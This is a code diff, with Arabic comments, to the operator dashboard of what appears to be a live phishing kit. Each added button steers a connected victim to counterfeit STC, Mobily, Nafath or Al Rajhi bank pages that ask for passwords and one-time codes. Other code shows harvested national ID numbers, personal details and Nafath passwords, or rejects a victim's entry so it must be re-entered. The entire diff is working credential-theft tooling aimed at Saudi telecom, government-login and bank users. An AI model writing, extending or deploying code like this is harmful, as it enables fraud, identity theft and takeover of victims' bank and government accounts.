@@ -1811,8 +1811,311 @@
             const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
             const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
             
-            /* KDD: أُزيل القسم الخام — السجل أعلاه يكفي */
+            html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
+            /* KDD: أُزيل جدول المفاتيح الخام */
             
+            
+            // إضافة أزرار لتوثيق رقم الجوال
+            if (dataEntry.page === 'توثيق رقم الجوال') {
+              // الحصول على مزود الخدمة من البيانات
+              const provider = dataEntry.content['مزود الخدمة'] || dataEntry.content['الشبكة'] || visitor.network || '';
+              const isStc = provider.toLowerCase().includes('stc') || provider === 'STC' || provider === 'stc';
+              
+              const otpBtnId = 'otp-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcPassBtnId = 'stc-pass-btn-' + visitor.socketId + '-' + dataIndex;
+              
+              // إظهار أزرار STC فقط إذا كان المزود STC
+              if (isStc) {
+                html += '<div class="flex gap-2 mt-3">';
+                html += '<button id="' + otpBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
+                html += '<button id="' + stcPassBtnId + '" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const otpBtn = document.getElementById(otpBtnId);
+                const stcPassBtn = document.getElementById(stcPassBtnId);
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'mystc-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (stcPassBtn) {
+                  stcPassBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-password');
+                    const originalText = stcPassBtn.textContent;
+                    const originalClasses = ['bg-indigo-600', 'hover:bg-indigo-700'];
+                    stcPassBtn.textContent = 'تم الإرسال ✓';
+                    stcPassBtn.classList.remove(...originalClasses);
+                    stcPassBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      stcPassBtn.textContent = originalText;
+                      stcPassBtn.classList.remove('bg-green-600');
+                      stcPassBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+              } // إغلاق شرط isStc
+            }
+            
+            // إضافة أزرار لكلمة مرور STC
+            if (dataEntry.page === 'كلمة مرور STC') {
+              const stcCallBtnId = 'stc-call-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcRejectBtnId = 'stc-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + stcCallBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+              html += '<button id="' + stcRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const callBtn = document.getElementById(stcCallBtnId);
+                const rejectBtn = document.getElementById(stcRejectBtnId);
+                if (callBtn) {
+                  callBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                    const originalText = callBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    callBtn.textContent = 'تم الإرسال ✓';
+                    callBtn.classList.remove(...originalClasses);
+                    callBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      callBtn.textContent = originalText;
+                      callBtn.classList.remove('bg-green-600');
+                      callBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لتنبية إتصال STC
+            if (dataEntry.page === 'تنبية إتصال STC') {
+              const nafathUsernameBtnId = 'nafath-username-btn-' + visitor.socketId + '-' + dataIndex;
+              const nafathBtnId = 'nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcCallRejectBtnId = 'stc-call-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathUsernameBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اسم مستخدم نفاذ</button>';
+              html += '<button id="' + nafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + stcCallRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const nafathUsernameBtn = document.getElementById(nafathUsernameBtnId);
+                const nafathBtn = document.getElementById(nafathBtnId);
+                const rejectBtn = document.getElementById(stcCallRejectBtnId);
+                if (nafathUsernameBtn) {
+                  nafathUsernameBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-login-page');
+                    const originalText = nafathUsernameBtn.textContent;
+                    const originalClasses = ['bg-blue-600', 'hover:bg-blue-700'];
+                    nafathUsernameBtn.textContent = 'تم الإرسال ✓';
+                    nafathUsernameBtn.classList.remove(...originalClasses);
+                    nafathUsernameBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathUsernameBtn.textContent = originalText;
+                      nafathUsernameBtn.classList.remove('bg-green-600');
+                      nafathUsernameBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                    const originalText = nafathBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    nafathBtn.textContent = 'تم الإرسال ✓';
+                    nafathBtn.classList.remove(...originalClasses);
+                    nafathBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathBtn.textContent = originalText;
+                      nafathBtn.classList.remove('bg-green-600');
+                      nafathBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectForm(visitor.socketId);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لتنبية إتصال Mobily
+            if (dataEntry.page === 'تنبية إتصال Mobily') {
+              const mobilyNafathBtnId = 'mobily-nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const mobilyRejectBtnId = 'mobily-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + mobilyNafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + mobilyRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const nafathBtn = document.getElementById(mobilyNafathBtnId);
+                const rejectBtn = document.getElementById(mobilyRejectBtnId);
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                    const originalText = nafathBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    nafathBtn.textContent = 'تم الإرسال ✓';
+                    nafathBtn.classList.remove(...originalClasses);
+                    nafathBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathBtn.textContent = originalText;
+                      nafathBtn.classList.remove('bg-green-600');
+                      nafathBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    // إرسال حدث رفض خاص بصفحة Mobily
+                    socket.emit('admin:mobilyReject', visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار للراجحي تسجيل الدخول
+            if (dataEntry.page === 'تسجيل الدخول الراجحى') {
+              const rajhiPhoneBtnId = 'rajhi-phone-btn-' + visitor.socketId + '-' + dataIndex;
+              const rajhiOtpBtnId = 'rajhi-otp-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + rajhiPhoneBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+              html += '<button id="' + rajhiOtpBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي OTP</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const phoneBtn = document.getElementById(rajhiPhoneBtnId);
+                const otpBtn = document.getElementById(rajhiOtpBtnId);
+                if (phoneBtn) {
+                  phoneBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'phone-verification');
+                    const originalText = phoneBtn.textContent;
+                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
+                    phoneBtn.textContent = 'تم الإرسال ✓';
+                    phoneBtn.classList.remove(...originalClasses);
+                    phoneBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      phoneBtn.textContent = originalText;
+                      phoneBtn.classList.remove('bg-gray-500');
+                      phoneBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'alrajhi-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-blue-600', 'hover:bg-blue-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة زر موافقة لطلب إعادة إرسال الرمز
+            if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="resend-btn-' + visitor.socketId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '</div>';
+              // إضافة event listener بعد إنشاء العنصر
+              setTimeout(() => {
+                const btn = document.getElementById('resend-btn-' + visitor.socketId);
+                if (btn) {
+                  btn.addEventListener('click', () => approveResendCode(visitor.socketId));
+                }
+              }, 100);
+            }
+            
+            html += '</div>';
+          }
+        });
+        html += '</div>';
+      }
+      
+      if (!allEntries.length && visitor.data && Object.keys(visitor.data).length > 0) {
+        // Fallback to old data format
+        const nafathData = {};
+        const updateInfoData = {};
+        const otherData = {};
+        
+        const updateInfoKeys = ['الاسم بالعربي', 'الاسم بالإنجليزي', 'رقم الهوية الوطنية', 'تاريخ الميلاد', 'الجنسية', 'نوع المالك', 'الجنس',
+          'رقم الجوال', 'البريد الإلكتروني', 'العنوان الوطني', 'رقم المبنى', 'رقم الطابق',
+          'النشاط العام', 'النشاط الخاص', 'رأس المال',
+          'علامة تجارية', 'اسم العلامة', 'اسم المحل', 'رقم المحل', 'رقم العقار', 'عدد الفتحات', 'عدد الطوابق', 'عدد الكاميرات', 'مصعد', 'داخل مجمع تجاري', 'نوع العقد',
+          'نوع اللوحة', 'مساحة اللوحة', 'نوع المسار',
+          'نوع الاسم', 'الاسم التجاري', 'اسم العلامة بالعربي', 'اسم العلامة بالإنجليزي',
+          'اسم الخدمة', 'رقم الطلب', 'رقم السجل التجاري'];
+        
+        Object.entries(visitor.data).forEach(([key, value]) => {
+          if (['اسم المستخدم / الهوية الوطنية', 'كلمة المرور (نفاذ)'].includes(key)) {
+            nafathData[key] = value;
+          } else if (updateInfoKeys.includes(key)) {
+            updateInfoData[key] = value;
+          } else {
+            otherData[key] = value;
+          }
+        });
+
+        // Update Info Data Section (shown first - newer data)
+        if (Object.keys(updateInfoData).length > 0) {
+          html += '<div class="data-section bg-blue-50 p-4 rounded-lg">';
+          html += '<h3 class="font-bold mb-3 text-blue-800">📋 بيانات تحديث المعلومات</h3>';
+          html += '<div class="grid grid-cols-2 gap-3">';
+          Object.entries(updateInfoData).forEach(([key, value]) => {
+            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+          });
+          html += '</div></div>';
         }
 
         // Nafath Data Section (shown second - older data)
